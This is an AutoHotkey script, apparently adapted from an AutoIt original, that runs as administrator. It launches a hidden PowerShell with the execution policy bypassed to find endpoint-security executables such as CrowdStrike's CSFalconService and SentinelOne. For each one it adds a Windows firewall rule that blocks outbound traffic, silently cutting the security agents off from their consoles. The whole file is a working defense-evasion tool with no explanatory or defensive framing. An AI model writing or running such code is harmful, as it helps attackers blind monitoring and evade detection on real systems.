#Requires AutoHotkey v2.0

/* Based on AutoIt version created by https://github.com/rayzax */

if A_IsAdmin {
    ; Define the PowerShell command
    psCmd := "powershell.exe -WindowStyle Hidden -NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"Get-ChildItem -Path 'C:\Program Files' -Recurse -File -Filter '*.exe' -ErrorAction SilentlyContinue | Where-Object { 'CSFalconService', 'SentinelOne', 'nwmagent', 'agent' -contains `$_.BaseName } | Select-Object -ExpandProperty FullName`""

    ; Run PowerShell and capture output directly
    shell := ComObject("WScript.Shell")
    exec := shell.Exec(psCmd)
    cmdOutput := exec.StdOut.ReadAll()

    ; Split output into array and process
    if (cmdOutput != "") {
        fileArray := StrSplit(cmdOutput, "`n", "`r")
        
        ; Iterate through found files
        for filePath in fileArray {
            ; Skip empty lines
            if (filePath = "")
                continue
                
            ; Extract filename
            lastBackslash := InStr(filePath, "\", , -1)
            fileName := SubStr(filePath, lastBackslash + 1)
            
            ; Create and execute netsh command
            netshCommand := 'netsh advfirewall firewall add rule name="Deny Outbound for ' fileName '" dir=out action=block program="' filePath '" enable=yes'

            RunWait netshCommand,, "Hide"
            
        } 
    } 
}




